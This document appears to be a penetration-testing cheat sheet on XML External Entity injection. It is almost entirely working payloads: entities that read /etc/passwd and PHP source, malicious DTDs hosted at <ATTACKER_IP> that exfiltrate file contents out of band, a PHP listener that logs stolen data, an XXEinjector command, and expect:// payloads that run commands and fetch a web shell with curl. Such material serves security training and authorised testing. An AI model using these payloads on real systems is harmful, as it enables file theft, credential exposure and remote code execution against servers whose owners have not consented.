# XML External Entity (XXE) Injection
**Concept:** XXE occurs when a weakly configured XML parser processes input containing a reference to an external entity. 
**Impact:** Local File Disclosure (LFD), Server-Side Request Forgery (SSRF), Denial of Service (DoS), and potentially Remote Code Execution (RCE).
## 1. Identification (Reconnaissance)
**Goal:** Detect if the application parses XML and accepts custom entities.
### Scenario A: Classic XML Input
If the request body is already XML.
**Payload (Verification):** Define an internal entity (`&company;`) and see if it reflects in the response.
```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
<email>&company;</email>
```
### Scenario B: Content-Type Spoofing (JSON to XML)
**Tradecraft:** Modern apps often default to JSON but support XML (legacy). 
**Action:** Change `Content-Type: application/json` to `application/xml` and convert the JSON body to XML.

**Original (JSON):**
```json
{"email": "test@test.com"}
```

**Modified (XML):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ <!ENTITY test "XXE_SUCCESS"> ]>
<root>
  <email>&test;</email>
</root>
```
## 2. Exploitation: Local File Disclosure (LFD)
**Goal:** Read sensitive system files (`/etc/passwd`, `C:\Windows\win.ini`, `id_rsa`).
### Basic LFD (SYSTEM Entity)
Used when the application reflects the entity content directly.
```xml
<!DOCTYPE email [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<root>
  <email>&file;</email>
</root>
```
### Source Code Disclosure (PHP Wrapper)
**Problem:** Reading files with special characters (like XML/HTML source code) breaks the parser. 
**Solution:** Use `php://filter` to base64 encode the file before inclusion.

**Payload:**
```xml
<!DOCTYPE email [
  <!ENTITY source SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
]>
<root>
  <email>&source;</email>
</root>
```
- **Post-Processing:** Decode the returned Base64 string to view source.
## 3. Advanced Exploitation: Bypassing Restrictions
**Goal:** Read files when basic reflection fails or XML syntax breaks (Binary data).
### CDATA Exfiltration (External DTD)
**Concept:** Wrap the file content in `<![CDATA[ ... ]]>` so the XML parser ignores special characters within the file. Requires an external DTD.

**1. Create Malicious DTD (`xxe.dtd`) on Attacker Host:**
```xml
<!ENTITY % begin "<![CDATA[">
<!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
<!ENTITY % end "]]>">
<!ENTITY % joined "<!ENTITY content '%begin;%file;%end;'>">
```

**2. Send Payload to Target:**
```xml
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://<ATTACKER_IP>:8000/xxe.dtd">
  %remote;
  %joined;
]>
<root>
  <email>&content;</email>
</root>
```
### Error-Based XXE
**Concept:** Force the application to leak file content within a verbose error message (e.g., PHP Runtime Error).

**1. Create Malicious DTD (`xxe.dtd`) on Attacker Host:**
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExisting;/%file;'>">
```

**2. Send Payload to Target:**
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://<ATTACKER_IP>:8000/xxe.dtd">
  %remote;
  %error;
]>
```
## 4. Blind Data Exfiltration (OOB)
**Concept:** The application parses XML but displays **no output**. We must force the server to send the data to us (Out-Of-Band).

**1. Setup Listener (PHP):** Host a script (`index.php`) on the attacker machine to log incoming base64 data.
```php
<?php
if(isset($_GET['content'])){
    error_log(base64_decode($_GET['content']));
}
?>
```

**2. Create Malicious DTD (`xxe.dtd`) on Attacker Host:**
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://<ATTACKER_IP>:8000/?content=%file;'>">
```

**3. Send Payload to Target:**
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://<ATTACKER_IP>:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```
### Automated Tool: XXEinjector

**Description:** Automates OOB exfiltration. 
**Syntax:**
```shell
# 1. Save the raw HTTP request to a file (req.txt)
# 2. Replace the injection point with the string 'XXEINJECT'
ruby XXEinjector.rb --host=<ATTACKER_IP> --httpport=8000 --file=req.txt --path=/etc/passwd --oob=http --phpfilter
```
## 5. Remote Code Execution (RCE)
**Status:** Rare. Requires specific configurations (e.g., PHP `expect` module enabled).
### PHP Expect Wrapper
**Syntax:**
```xml
<!DOCTYPE email [
  <!ENTITY rce SYSTEM "expect://id">
]>
<root>
  <email>&rce;</email>
</root>
```
### Web Shell Upload (via Curl)
If `expect` is enabled but output is limited, use it to download a shell. **Syntax:**
```xml
<!DOCTYPE email [
  <!ENTITY rce SYSTEM "expect://curl$IFS-O$IFS'<ATTACKER_IP>/shell.php'">
]>
<email>&rce;</email>
```